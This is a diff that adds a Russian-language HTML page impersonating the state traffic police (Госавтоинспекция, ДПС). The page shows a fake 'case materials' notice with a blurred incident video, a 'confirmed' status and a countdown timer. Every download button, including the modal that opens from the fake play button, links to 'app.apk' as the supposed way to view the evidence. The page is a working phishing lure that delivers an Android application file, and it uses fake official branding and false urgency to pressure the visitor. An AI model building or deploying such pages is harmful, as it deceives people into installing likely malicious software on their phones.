@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Госавтоинспекция — Материалы дела</title>
+    <style>
+        :root {
+            --ios-blue: #007aff;
+            --ios-gray: #8e8e93;
+            --ios-bg: #f2f2f7;
+            --success: #34c759;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: var(--ios-bg);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .main-card {
+            width: 100%;
+            max-width: 500px;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Шапка */
+        .header {
+            padding: 18px 16px;
+            display: flex;
+            align-items: center;
+            border-bottom: 0.5px solid #d1d1d6;
+        }
+
+        .badge-dps {
+            width: 52px;
+            height: 52px;
+            background: #1a73e8;
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            margin-right: 14px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .shield-icon-img {
+            width: 20px;
+            height: 20px;
+            margin-bottom: 2px;
+            filter: brightness(0) invert(1);
+        }
+
+        .badge-dps .t { font-size: 11px; font-weight: 800; letter-spacing: 0.5px; }
+
+        .header-title { display: flex; align-items: center; gap: 8px; }
+        .header-title b { font-size: 17px; color: #000; }
+        .header-title .title-shield { width: 18px; height: 18px; }
+        .header-sub { font-size: 13px; color: var(--ios-gray); display: block; margin-top: 2px; }
+
+        /* Контент */
+        .page-content { padding: 20px; flex-grow: 1; }
+        .status-line { color: var(--success); font-size: 13px; font-weight: 600; margin-bottom: 12px; display: flex; align-items: center; gap: 5px; }
+
+        .video-container {
+            width: 100%;
+            height: 225px;
+            background: #000 url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT-leuffC8DqZt8pq-fBRzhcxymcfJguyFs6w&s') no-repeat center; 
+            background-size: cover;
+            border-radius: 14px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            cursor: pointer;
+        }
+
+        .video-container::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: rgba(0,0,0,0.3);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+        }
+
+        .play-btn {
+            z-index: 2;
+            width: 64px;
+            height: 64px;
+            background: rgba(255,255,255,0.9);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+
+        .play-btn::after {
+            content: '';
+            border-style: solid;
+            border-width: 10px 0 10px 18px;
+            border-color: transparent transparent transparent #000;
+            margin-left: 5px;
+        }
+
+        .duration-label {
+            position: absolute;
+            bottom: 12px;
+            right: 12px;
+            background: rgba(0,0,0,0.8);
+            color: #fff;
+            padding: 3px 7px;
+            border-radius: 5px;
+            font-size: 12px;
+            font-weight: 600;
+            z-index: 3;
+        }
+
+        h1 { font-size: 24px; margin: 22px 0 8px; font-weight: 700; }
+        .sub-text { font-size: 14px; color: #3a3a3c; line-height: 1.45; margin-bottom: 25px; }
+
+        .info-list { border-top: 0.5px solid #e5e5ea; }
+        .info-item { display: flex; justify-content: space-between; padding: 14px 0; border-bottom: 0.5px solid #e5e5ea; font-size: 15px; }
+        .info-item .label { color: var(--ios-gray); }
+        .info-item .val { font-weight: 500; }
+
+        /* Кнопка */
+        .action-area { padding: 20px; text-align: center; background: white; border-top: 0.5px solid #e5e5ea; }
+        .main-button {
+            display: block;
+            background: var(--ios-blue);
+            color: white;
+            text-decoration: none;
+            padding: 16px;
+            border-radius: 14px;
+            font-size: 17px;
+            font-weight: 600;
+        }
+
+        .timer-row { font-size: 13px; color: var(--ios-gray); margin-bottom: 15px; }
+        .timer-row span { color: #ff3b30; font-weight: 700; }
+
+        /* --- СТИЛІ ДЛЯ ТЕКСТУ, ЩО ВИСКАКУЄ --- */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-card {
+            background: white;
+            width: 85%;
+            max-width: 320px;
+            padding: 25px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+
+        .modal-card h3 { margin: 10px 0; }
+        .modal-card p { font-size: 14px; color: var(--ios-gray); margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="main-card">
+    <div class="header">
+        <div class="badge-dps">
+            <img src="https://cdn-icons-png.freepik.com/512/8017/8017361.png" class="shield-icon-img" alt="щит">
+            <span class="t">ДПС</span>
+        </div>
+        <div>
+            <div class="header-title">
+                <img src="https://cdn-icons-png.freepik.com/512/8017/8017361.png" class="title-shield" alt="щит">
+                <b>Госавтоинспекция</b>
+            </div>
+            <span class="header-sub">Официальное уведомление</span>
+        </div>
+    </div>
+
+    <div class="page-content">
+        <div class="status-line">● Доступ открыт</div>
+        
+        <div class="video-container" onclick="openModal()">
+            <div class="play-btn"></div>
+            <div class="duration-label">0:48</div>
+        </div>
+
+        <h1>Материалы дела</h1>
+        <p class="sub-text">
+            Для просмотра видеозаписи происшествия и ознакомления с протоколом необходимо использовать официальное приложение.
+        </p>
+
+        <div class="info-list">
+            <div class="info-item">
+                <span class="label">Дата</span>
+                <span class="val">06 марта 2026</span>
+            </div>
+            <div class="info-item">
+                <span class="label">Статус</span>
+                <span class="val" style="color: var(--success);">Подтверждено</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="action-area">
+        <p class="timer-row">Доступ истекает через: <span id="timer">23:59:59</span></p>
+        <a href="app.apk" class="main-button">📱 ОТКРЫТЬ МАТЕРИАЛЫ</a>
+    </div>
+</div>
+
+<div class="modal-overlay" id="modal-box">
+    <div class="modal-card">
+        <img src="https://cdn-icons-png.freepik.com/512/8017/8017361.png" style="width: 50px;" alt="щит">
+        <h3>Внимание</h3>
+        <p>Для просмотра материалов дела необходимо установить защищенное соединение через приложение.</p>
+        <a href="app.apk" class="main-button">Продолжить</a>
+    </div>
+</div>
+
+<script>
+    // Таймер
+    let sec = 86399;
+    setInterval(() => {
+        let h = Math.floor(sec / 3600);
+        let min = Math.floor((sec % 3600) / 60);
+        let s = sec % 60;
+        document.getElementById("timer").innerHTML = `${h<10?'0':''}${h}:${min<10?'0':''}${min}:${s<10?'0':''}${s}`;
+        if (sec > 0) sec--;
+    }, 1000);
+
+    // Функція появи тексту
+    function openModal() {
+        document.getElementById('modal-box').classList.add('active');
+    }
+
+    // Закриття при кліку на фон
+    document.getElementById('modal-box').onclick = function(e) {
+        if(e.target == this) this.classList.remove('active');
+    }
+</script>
+
+</body>
+</html>
